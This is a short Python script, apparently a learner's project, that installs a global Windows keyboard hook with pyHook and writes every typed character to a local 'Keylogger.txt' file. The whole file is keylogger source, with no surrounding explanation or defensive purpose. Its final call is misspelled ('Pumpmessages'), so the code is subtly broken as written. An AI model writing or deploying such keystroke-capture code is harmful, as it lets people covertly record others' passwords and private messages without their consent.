import pyHook
import pythoncom

import sys
import logging

file_log = "C:\\Python_summer2k17\\Keylogger.txt"

def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log, level= logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent
hooks_manager.HookKeyboard()
pythoncom.Pumpmessages()